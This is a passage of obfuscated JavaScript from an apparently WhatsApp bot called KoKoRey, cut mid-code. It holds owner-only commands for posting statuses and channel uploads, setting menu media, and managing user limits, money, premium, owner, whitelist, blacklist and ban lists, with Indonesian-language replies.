          global.db.data.settings[_0xb3f81d].totalhit = 0x0;
          _0x3a091f(mess.done);
        }
        break;
      case "setmenu":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Ada 14 pilihan reply (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, 15, 16, 17, 18, 19, 20)\nSilakan pilih salah satu.\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " v1");
          }
          if (_0x2b2627.startsWith('v')) {
            typemenu = _0x2b2627;
            return _0x3a091f(mess.done);
          }
          ;
          return _0x3a091f("Ada 14 pilihan reply (v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, 15, 16, 17, 18, 19, 20)\nSilakan pilih salah satu.\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " v1");
        }
        break;
      case "setreply":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Ada 6 pilihan reply (v1, v2, v3, v4, v5, v6)\nSilakan pilih salah satu.\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " v1");
          }
          if (_0x2b2627.startsWith('v')) {
            typereply = _0x2b2627;
            return _0x3a091f(mess.done);
          }
          ;
          return _0x3a091f("Ada 14 pilihan reply (v1, v2, v3, v4, v5, v6)\nSilakan pilih salah satu.\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " v1");
        }
        break;
      case 'storytext':
      case "upswtext":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Teksnya mana?");
          }
          await _0x59f5fa.sendMessage("status@broadcast", {
            'text': _0x2b2627
          }, {
            'backgroundColor': '#FF000000',
            'font': 0x3,
            'statusJidList': Object.keys(db.data.users)
          });
          _0x3a091f("Sukses kirim status teks!");
        }
        break;
      case "storyvideo":
      case "upswvideo":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (/video/.test(_0x3df746)) {
            var _0x535cdf = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            let _0x701741 = _0x5dba36.fileLength ? (_0x5dba36.fileLength / 0x400 / 0x400).toFixed(0x2) + " MB" : "Tidak diketahui";
            let _0x483aef = _0x3df746 || "Tidak diketahui";
            let _0x19aac3 = new Date().toLocaleString("id-ID", {
              'timeZone': 'Asia/Jakarta'
            });
            let _0x284e05 = '' + (_0x3f87c6.pushName || ownerName);
            let _0x57bfb3 = "📁 *Ukuran File*: " + _0x701741 + "\n";
            _0x57bfb3 += "🎥 *Tipe Media*: " + _0x483aef + "\n";
            _0x57bfb3 += "⏰ *Waktu Dikirim*: " + _0x19aac3 + "\n";
            _0x57bfb3 += "👤 *Dikirim oleh*: " + _0x284e05;
            await _0x59f5fa.sendMessage("status@broadcast", {
              'video': {
                'url': _0x535cdf
              },
              'caption': _0x2b2627 ? _0x2b2627 : _0x57bfb3
            }, {
              'statusJidList': Object.keys(db.data.users)
            });
            await _0x3a091f("✅ Video berhasil dikirim ke status WhatsApp dengan caption bawaan!");
          } else {
            _0x3a091f("⚠️ Tolong reply ke video dulu ya, Kak! 🎥");
          }
        }
        break;
      case "storyimg":
      case "storyimage":
      case 'upswimg':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (/image/.test(_0x3df746)) {
            var _0x28d3e7 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            let _0x4bd235 = _0x5dba36.fileLength ? (_0x5dba36.fileLength / 0x400 / 0x400).toFixed(0x2) + " MB" : "Tidak diketahui";
            let _0x5b6f6c = _0x3df746 || "Tidak diketahui";
            let _0x376c65 = new Date().toLocaleString('id-ID', {
              'timeZone': "Asia/Jakarta"
            });
            let _0x43a822 = '' + (_0x3f87c6.pushName || ownerName);
            let _0x625c61 = "📁 *Ukuran File*: " + _0x4bd235 + "\n";
            _0x625c61 += "🖼️ *Tipe Media*: " + _0x5b6f6c + "\n";
            _0x625c61 += "⏰ *Waktu Dikirim*: " + _0x376c65 + "\n";
            _0x625c61 += "👤 *Dikirim oleh*: " + _0x43a822;
            await _0x59f5fa.sendMessage('status@broadcast', {
              'image': {
                'url': _0x28d3e7
              },
              'caption': _0x2b2627 ? _0x2b2627 : _0x625c61
            }, {
              'statusJidList': Object.keys(db.data.users)
            });
            await _0x3a091f("✅ Gambar berhasil dikirim ke status WhatsApp dengan caption bawaan! 🖼️✨");
          } else {
            _0x3a091f("⚠️ Tolong reply ke gambar dulu ya, Kak! 🖼️");
          }
        }
        break;
      case "storyaudio":
      case "upswaudio":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (/audio/.test(_0x3df746)) {
            var _0x5b3896 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
            await _0x59f5fa.sendMessage("status@broadcast", {
              'audio': {
                'url': _0x5b3896
              },
              'mimetype': "audio/mp4",
              'ptt': true
            }, {
              'backgroundColor': "#FF000000",
              'statusJidList': Object.keys(db.data.users)
            });
            await _0x3a091f("✅ Audio berhasil dikirim ke status WhatsApp!");
          } else {
            _0x3a091f("⚠️ Tolong reply ke audio dulu ya, Kak! 🎧");
          }
        }
        break;
      case 'uploadnewsletter':
      case "upnewsletter":
      case "upchannel":
      case "upsaluran":
      case "upch":
      case "upsal":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          try {
            if (!_0x3df746 && !_0x2b2627) {
              return _0x3a091f("Uh-oh, kak! Kamu belum kirim media atau teks apa pun. Coba lagi ya! 🤭");
            }
            media = _0x3df746 ? await _0x5dba36.download() : null;
            if (/image/.test(_0x3df746)) {
              _0x59f5fa.sendMessage(saluran, {
                'image': media,
                'caption': _0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨",
                'contextInfo': {
                  'mentionedJid': [_0x3f87c6.sender],
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'forwardedNewsletterMessageInfo': {
                    'newsletterName': saluranName,
                    'newsletterJid': saluran
                  },
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'title': botName,
                    'body': ownerName,
                    'thumbnailUrl': imageUrl,
                    'sourceUrl': website,
                    'mediaType': 0x1,
                    'renderLargerThumbnail': true
                  }
                }
              });
              _0x3a091f("📸 Gambar berhasil diunggah ke saluran dengan caption: \"" + (_0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨") + "\"");
            } else {
              if (/video/.test(_0x3df746)) {
                _0x59f5fa.sendMessage(saluran, {
                  'video': media,
                  'caption': _0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨",
                  'contextInfo': {
                    'mentionedJid': [_0x3f87c6.sender],
                    'forwardingScore': 0xf423f,
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterName': saluranName,
                      'newsletterJid': saluran
                    },
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'title': botName,
                      'body': ownerName,
                      'thumbnailUrl': imageUrl,
                      'sourceUrl': website,
                      'mediaType': 0x1,
                      'renderLargerThumbnail': true
                    }
                  }
                });
                _0x3a091f("🎥 Video berhasil diunggah ke saluran dengan caption: \"" + (_0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨") + "\"");
              } else {
                if (/audio/.test(_0x3df746)) {
                  _0x59f5fa.sendMessage(saluran, {
                    'audio': media,
                    'mimetype': _0x3df746,
                    'ptt': true,
                    'contextInfo': {
                      'mentionedJid': [_0x3f87c6.sender],
                      'forwardingScore': 0xf423f,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterName': saluranName,
                        'newsletterJid': saluran
                      },
                      'externalAdReply': {
                        'showAdAttribution': true,
                        'title': botName,
                        'body': ownerName,
                        'thumbnailUrl': imageUrl,
                        'sourceUrl': website,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': true
                      }
                    }
                  });
                  _0x3a091f("🎵 Audio berhasil diunggah ke saluran, kak!");
                } else if (/text/.test(_0x3df746) || _0x2b2627) {
                  _0x59f5fa.sendMessage(saluran, {
                    'text': _0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨",
                    'contextInfo': {
                      'mentionedJid': [_0x3f87c6.sender],
                      'forwardingScore': 0xf423f,
                      'isForwarded': true,
                      'forwardedNewsletterMessageInfo': {
                        'newsletterName': saluranName,
                        'newsletterJid': saluran
                      },
                      'externalAdReply': {
                        'showAdAttribution': true,
                        'title': botName,
                        'body': ownerName,
                        'thumbnailUrl': imageUrl,
                        'sourceUrl': website,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': true
                      }
                    }
                  });
                  _0x3a091f("💬 Pesan teks berhasil dikirim ke saluran: \"" + (_0x2b2627 ? _0x2b2627 : "✨ Media ini dikirim melalui sistem otomatis KoKoRey! ✨") + "\"");
                } else {
                  _0x3a091f("Hmm... KoKoRey gak tau ini jenis media apa. Coba dicek lagi ya, kak! 🧐");
                }
              }
            }
          } catch (_0x23ec55) {
            console.error(_0x23ec55);
            _0x3a091f("Aduh, kak! 😣 Ada masalah waktu unggah ke saluran. Coba lagi nanti ya!");
          }
        }
        break;
      case "setimgmenu":
      case "sim":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x1df242 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          await fsx.copy(_0x1df242, "./media/imageBuffer.png");
          fs.unlinkSync(_0x1df242);
          _0x3a091f("Gambar menu berhasil diset! 🎨");
        }
        break;
      case 'setvidmenu':
      case "svm":
      case "setvgifmenu":
      case 'sgm':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x1414b1 = await _0x59f5fa.downloadAndSaveMediaMessage(_0x5dba36);
          await fsx.copy(_0x1414b1, "./media/videoBuffer.mp4");
          fs.unlinkSync(_0x1414b1);
          _0x3a091f("Video menu berhasil diset! 🎬");
        }
        break;
      case "addgelar":
      case "addtitle":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " nomor,gelar");
          }
          nonya = _0x2b2627.split(',')[0x0];
          titlenya = _0x2b2627.split(',')[0x1];
          let _0x346942 = nonya + "@s.whatsapp.net";
          db.data.users[_0x346942].title = titlenya;
          await _0x3a091f("Gelar user berhasil ditambahkan! 🎉");
        }
        break;
      case "delgelar":
      case 'deltitle':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " number");
          }
          nonya = _0x2b2627.split(',')[0x0];
          let _0x28e5bf = nonya + '@s.whatsapp.net';
          db.data.users[_0x28e5bf].title = '';
          await _0x3a091f("Gelar user berhasil dihapus! ✨");
        }
        break;
      case 'addid':
      case 'addinfo':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " nomor,nama,umur,asal,gelar");
          }
          let _0x561853 = _0x2b2627.split(',').map(_0x463b63 => _0x463b63.trim());
          if (_0x561853.length < 0x5) {
            return _0x3a091f("⚠️ Format salah! Pastikan mengirim: nomor,nama,umur,asal,gelar");
          }
          let [_0x1ede2a, _0x1d932c, _0x446369, _0x27c9a2, _0x20c658] = _0x561853;
          if (!/^\d+$/.test(_0x1ede2a)) {
            return _0x3a091f("⚠️ Nomor harus berupa angka tanpa spasi atau simbol lain.");
          }
          let _0x36ce65 = _0x1ede2a + "@s.whatsapp.net";
          db.data.users[_0x36ce65].nama = _0x1d932c;
          db.data.users[_0x36ce65].umur = Number(_0x446369);
          db.data.users[_0x36ce65].askot = _0x27c9a2;
          db.data.users[_0x36ce65].title = _0x20c658;
          await _0x3a091f("✅ Identitas user berhasil ditambahkan! 🎉");
        }
        break;
      case "addlimit":
      case "givelimit":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789,10");
          }
          let [_0x6a3461, _0x34a814] = _0x2b2627.split(',');
          return _0x42c746("add", _0x6a3461, _0x34a814);
        }
        break;
      case "dellimit":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789,10");
          }
          let [_0x2c4666, _0x48768b] = _0x2b2627.split(',');
          return _0x42c746("del", _0x2c4666, _0x48768b);
        }
        break;
      case "resetlimit":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789");
          }
          return _0x42c746("reset", _0x2b2627);
        }
        break;
      case 'resetdblimit':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x324005 = Object.keys(db.data.users);
          for (let _0x3c0b48 of _0x324005) {
            const _0x28c182 = db.data.users[_0x3c0b48].vip ? global.limit.vip : checkPremiumUser(_0x3c0b48, premium) ? global.limit.premium : global.limit.free;
            db.data.users[_0x3c0b48].limit = _0x28c182;
          }
          return _0x3a091f("✅ Limit semua user berhasil di-reset! ✂️");
        }
        break;
      case "adduang":
      case 'givemoney':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789,1000");
          }
          let [_0x96b8dd, _0x182f8d] = _0x2b2627.split(',');
          return _0x1ac163("add", _0x96b8dd, _0x182f8d);
        }
        break;
      case "deluang":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789,1000");
          }
          let [_0x2eb05f, _0x454248] = _0x2b2627.split(',');
          return _0x1ac163("del", _0x2eb05f, _0x454248);
        }
        break;
      case "resetuang":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("❗ Kirim perintah: " + (_0x4773c6 + _0x4ac520) + " 628123456789");
          }
          return _0x1ac163("reset", _0x2b2627);
        }
        break;
      case 'resetdbmoney':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          let _0x4e3233 = Object.keys(db.data.users);
          for (let _0x508b27 of _0x4e3233) {
            const _0xf2ea6e = db.data.users[_0x508b27].vip ? global.uang.vip : checkPremiumUser(_0x508b27, premium) ? global.uang.premium : global.uang.free;
            db.data.users[_0x508b27].uang = _0xf2ea6e;
          }
          return _0x3a091f("✅ Uang semua user berhasil di-reset! ✂️");
        }
        break;
      case "addpr":
      case "addprem":
      case 'addpremium':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Contoh:\n" + (_0x4773c6 + _0x4ac520) + " @tag,durasi(s/m/h/d)");
          }
          let [_0x1ff0e3, _0xedc6f2] = _0x2b2627.split`,`;
          const _0x2d08d1 = _0x1ff0e3.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          const _0x110118 = await _0x59f5fa.onWhatsApp(_0x2d08d1);
          if (!_0x110118.length > 0x0) {
            return _0x3a091f("Nomor tersebut tidak terdaftar di WhatsApp! ❌");
          }
          if (_0xedc6f2) {
            let _0x1b8f91 = "✅ Berhasil menambahkan @" + _0x2d08d1.split('@')[0x0] + " sebagai pengguna *Premium* selama *" + _0xedc6f2 + "*!\n\n";
            _0x1b8f91 += "*Benefit Premium*:\n";
            _0x1b8f91 += "- *Download*: 50MB/s\n";
            _0x1b8f91 += "- *Limit*: 1000/d\n";
            _0x1b8f91 += "- *Request*: 10/5s\n";
            _0x1b8f91 += "- *VIP Access*: Yes\n";
            _0x1b8f91 += "- *User Priority*: Yes\n";
            await addPremiumUser(_0x2d08d1, _0xedc6f2, premium);
            await _0x3a091f(_0x1b8f91);
            db.data.users[_0x2d08d1].limit = db.data.users[_0x2d08d1].vip ? global.limit.vip : global.limit.premium;
            db.data.users[_0x2d08d1].uang = db.data.users[_0x2d08d1].vip ? global.uang.vip : global.uang.premium;
            db.data.users[_0x2d08d1].premium = true;
            db.data.users[_0x2d08d1].vip = true;
          } else {
            _0x3a091f("Masukkan durasi yang valid!\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " @tag,durasi(s/m/h/d)");
          }
        }
        break;
      case 'delpr':
      case "delprem":
      case 'delpremium':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x2b2627) {
            return _0x3a091f("Contoh:\n" + (_0x4773c6 + _0x4ac520) + " @tag");
          }
          const _0x4d05e3 = _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          if (checkPremiumUser(_0x4d05e3, premium)) {
            premium.splice(getPremiumPosition(_0x4d05e3, premium), 0x1);
            fs.writeFileSync("./src/data/role/premium.json", JSON.stringify(premium));
            let _0x3bda4c = "✅ Berhasil menghapus @" + _0x4d05e3.split('@')[0x0] + " dari daftar *Premium*!\n\n";
            _0x3bda4c += "*Benefit Regular*:\n";
            _0x3bda4c += "- *Download*: 2MB/s\n";
            _0x3bda4c += "- *Limit*: 20/d\n";
            _0x3bda4c += "- *Request*: 1/5s\n";
            _0x3bda4c += "- *VIP Access*: No\n";
            _0x3bda4c += "- *User Priority*: No\n";
            await _0x3a091f(_0x3bda4c);
            db.data.users[_0x4d05e3].limit = db.data.users[_0x4d05e3].vip ? global.limit.vip : global.limit.free;
            db.data.users[_0x4d05e3].uang = db.data.users[_0x4d05e3].vip ? global.uang.vip : global.uang.free;
            db.data.users[_0x4d05e3].premium = false;
            db.data.users[_0x4d05e3].vip = false;
          } else {
            _0x3a091f("⚠️ Pengguna @" + _0x4d05e3.split('@')[0x0] + " bukan pengguna *Premium*!");
          }
        }
        break;
      case "listpremium":
      case 'listprem':
        {
          let _0x1748b2 = "*🌟 DAFTAR PREMIUM 🌟*\n\n";
          let _0xba4098 = [];
          if (premium.length === 0x0) {
            _0x1748b2 += "Tidak ada pengguna premium saat ini. 🫤";
          } else {
            for (let _0x1f02e5 of premium) {
              _0xba4098.push(_0x1f02e5.id);
              _0x1748b2 += "- *Nomor*: +" + _0x1f02e5.id.split('@')[0x0] + "\n";
              if (_0x1f02e5.expired === "PERMANENT") {
                _0x1748b2 += "- *Expired*: PERMANENT\n\n";
              } else {
                let _0x3e5f22 = ms(_0x1f02e5.expired - Date.now());
                _0x1748b2 += "- *Expired*: " + _0x3e5f22.days + "d, " + _0x3e5f22.hours + "h, " + _0x3e5f22.minutes + "m\n\n";
              }
            }
          }
          _0x3a091f(_0x1748b2);
        }
        break;
      case "addowner":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458[0x0]) {
            return _0x3a091f("Gunakan " + (_0x4773c6 + _0x4ac520) + " nomor\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " " + ownerNumber);
          }
          bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
          let _0x27f536 = await _0x59f5fa.onWhatsApp(bnnd);
          if (_0x27f536.length == 0x0) {
            return _0x3a091f("Masukkan nomor yang valid dan terdaftar di WhatsApp!");
          }
          owner.push(bnnd);
          fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
          _0x3a091f("Nomor " + bnnd + " sekarang menjadi Owner!!! 🎉");
        }
        break;
      case "delowner":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          if (!_0x143458[0x0]) {
            return _0x3a091f("Gunakan " + (_0x4773c6 + _0x4ac520) + " nomor\n*Kirim perintah*: " + (_0x4773c6 + _0x4ac520) + " " + ownerNumber);
          }
          ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
          unp = owner.indexOf(ya);
          owner.splice(unp, 0x1);
          fs.writeFileSync("./src/data/role/owner.json", JSON.stringify(owner));
          _0x3a091f("Nomor " + ya + " berhasil dihapus dari daftar owner! ❌");
        }
        break;
      case "listowner":
        {
          let _0x3a2231 = "📝 *List Owner:*\n\n";
          owner.forEach((_0x55c3fb, _0x295dc7) => {
            _0x3a2231 += "⭐ " + (_0x295dc7 + 0x1) + ". " + _0x55c3fb + "\n";
          });
          _0x3a2231 += "\n📊 *Total: " + owner.length + '*';
          _0x3a091f(_0x3a2231);
        }
        break;
      case 'wl':
      case "whitelist":
        {
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          try {
            let _0x5a5c2 = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (!_0x5a5c2) {
              return _0x3a091f("Kak, tolong kirim nomor atau tag seseorang yang ingin di-whitelist!");
            }
            if (ownerNumber.includes(_0x5a5c2)) {
              return _0x3a091f("Eits, dia itu owner! Nggak bisa di-whitelist atau diubah statusnya!");
            }
            if (whitelist.includes(_0x5a5c2)) {
              return _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x5a5c2.split('@')[0x0] + " sudah ada dalam daftar whitelist!", _0x3f87c6);
            }
            whitelist.push(_0x5a5c2);
            fs.writeFileSync("./src/data/function/whitelist.json", JSON.stringify(whitelist, null, 0x2));
            _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, "Berhasil! @" + _0x5a5c2.split('@')[0x0] + " sekarang ada dalam daftar whitelist!", _0x3f87c6);
          } catch (_0x3843e1) {
            console.error("Error saat menambahkan ke whitelist:", _0x3843e1);
            _0x3a091f("Oops! Ada kesalahan. Pastikan kakak mengirim nomor atau tag seseorang yang ingin di-whitelist!");
          }
        }
        break;
      case 'unwhite':
      case "unwhitelist":
        {
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          try {
            let _0x1d1ebc = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (!_0x1d1ebc) {
              return _0x3a091f("Kak, tolong kirim nomor atau tag seseorang yang ingin dihapus dari whitelist!");
            }
            if (ownerNumber.includes(_0x1d1ebc)) {
              return _0x3a091f("Eits, dia itu owner! Nggak bisa dihapus dari whitelist!");
            }
            if (!whitelist.includes(_0x1d1ebc)) {
              return _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x1d1ebc.split('@')[0x0] + " tidak ditemukan dalam daftar whitelist!", _0x3f87c6);
            }
            whitelist.splice(whitelist.indexOf(_0x1d1ebc), 0x1);
            fs.writeFileSync('./src/data/function/whitelist.json', JSON.stringify(whitelist, null, 0x2));
            _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x1d1ebc.split('@')[0x0] + " telah dihapus dari daftar whitelist!", _0x3f87c6);
          } catch (_0x37e63b) {
            console.error("Error saat menghapus dari whitelist:", _0x37e63b);
            _0x3a091f("Oops! Ada kesalahan. Pastikan kakak mengirim nomor atau tag seseorang yang ingin dihapus dari whitelist!");
          }
        }
        break;
      case "listwl":
      case 'listwhitelist':
        {
          try {
            let _0x1d0e89 = "✨ *Daftar Whitelist* ✨\nTotal: *" + whitelist.length + "* pengguna\n\n";
            for (let _0x58f862 of whitelist) {
              _0x1d0e89 += "- @" + _0x58f862.split('@')[0x0] + "\n";
            }
            _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, _0x1d0e89, _0x3f87c6);
          } catch (_0x346239) {
            console.error("Error saat menampilkan daftar whitelist:", _0x346239);
            _0x3a091f("Oops! Ada kesalahan saat menampilkan daftar whitelist.");
          }
        }
        break;
      case 'bl':
      case "blacklist":
      case "tandai":
        {
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          try {
            let _0x56c2ab = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (!_0x56c2ab) {
              return _0x3a091f("Kak, tolong kirim nomor atau tag seseorang yang ingin dimasukkan ke blacklist!");
            }
            if (ownerNumber.includes(_0x56c2ab)) {
              return _0x3a091f("Eits, dia itu owner! Nggak bisa dimasukkan ke blacklist!");
            }
            if (blacklist.includes(_0x56c2ab)) {
              return _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x56c2ab.split('@')[0x0] + " sudah ada dalam daftar blacklist!", _0x3f87c6);
            }
            blacklist.push(_0x56c2ab);
            fs.writeFileSync("./src/data/function/blacklist.json", JSON.stringify(blacklist, null, 0x2));
            _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x56c2ab.split('@')[0x0] + " telah masuk dalam daftar blacklist!", _0x3f87c6);
          } catch (_0x11df57) {
            console.error(_0x11df57);
            _0x3a091f("Oops! Ada kesalahan. Pastikan kakak mengirim nomor atau tag seseorang yang ingin dimasukkan ke blacklist!");
          }
        }
        break;
        case "unbl":
      case "unblack":
      case 'unblacklist':
        {
          if (!_0x2cfe7f && !_0x5312e8) {
            return _0x3a091f(mess.admin);
          }
          try {
            let _0x5f22fa = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            if (!_0x5f22fa) {
              return _0x3a091f("Kak, tolong kirim nomor atau tag seseorang yang ingin dihapus dari blacklist!");
            }
            if (ownerNumber.includes(_0x5f22fa)) {
              return _0x3a091f("Eits, dia itu owner! Nggak bisa dihapus dari blacklist!");
            }
            if (!blacklist.includes(_0x5f22fa)) {
              return _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x5f22fa.split('@')[0x0] + " tidak ditemukan dalam daftar blacklist!", _0x3f87c6);
            }
            blacklist.splice(blacklist.indexOf(_0x5f22fa), 0x1);
            fs.writeFileSync('./src/data/function/blacklist.json', JSON.stringify(blacklist, null, 0x2));
            _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, '@' + _0x5f22fa.split('@')[0x0] + " telah dihapus dari daftar blacklist!", _0x3f87c6);
          } catch (_0x18426e) {
            console.error(_0x18426e);
            _0x3a091f("Oops! Ada kesalahan. Pastikan kakak mengirim nomor atau tag seseorang yang ingin dihapus dari blacklist!");
          }
        }
        break;
      case 'listbl':
      case 'listblacklist':
        {
          let _0x2a5a51 = "🚫 *Daftar Blacklist* 🚫\nTotal: *" + blacklist.length + "* pengguna\n\n";
          for (let _0x5e3805 of blacklist) {
            _0x2a5a51 += "- @" + _0x5e3805.split('@')[0x0] + "\n";
          }
          _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, _0x2a5a51, _0x3f87c6);
        }
        break;
      case "listban":
      case "listbanned":
        {
          let _0x444198 = "⛔ *Daftar Pengguna yang Diblokir* ⛔\nTotal: *" + banned.length + "* pengguna\n\n";
          for (let _0x2a496e of banned) {
            _0x444198 += "- @" + _0x2a496e.split('@')[0x0] + "\n";
          }
          _0x59f5fa.sendTextWithMentions(_0x3f87c6.chat, _0x444198, _0x3f87c6);
        }
        break;
      case "ban":
      case "banned":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          try {
            let _0x1c2e99 = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            if (!_0x1c2e99) {
              return _0x3a091f("Kak, tolong kirim nomor atau tag seseorang yang ingin diblokir!");
            }
            if (ownerNumber.includes(_0x1c2e99)) {
              return _0x3a091f("Eits, dia itu owner! Nggak bisa diblokir!");
            }
            if (banned.includes(_0x1c2e99)) {
              return _0x3a091f("Nomor tersebut sudah ada dalam daftar banned sebelumnya!");
            }
            banned.push(_0x1c2e99);
            fs.writeFileSync("./src/data/function/banned.json", JSON.stringify(banned, null, 0x2));
            _0x3a091f("Berhasil! @" + _0x1c2e99.split('@')[0x0] + " telah diblokir!");
          } catch (_0x20ab7b) {
            _0x3a091f("Oops! Ada kesalahan. Pastikan kakak mengirim nomor atau tag seseorang yang ingin diblokir!");
          }
        }
        break;
      case "delsession":
      case 'clearsession':
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          fs.readdir("./session", async function (_0x48d3f1, _0x45dad4) {
            if (_0x48d3f1) {
              console.log("Gak bisa scan direktori: " + _0x48d3f1);
              return _0x3a091f("Gak bisa scan direktori nih: " + _0x48d3f1);
            }
            let _0x36da37 = _0x45dad4.filter(_0x20ea7f => _0x20ea7f !== "creds.json");
            console.log(_0x36da37.length);
            let _0x643d36 = "Ditemukan " + _0x36da37.length + " file sampah nih (kecuali creds.json)\n\n";
            if (_0x36da37.length == 0x0) {
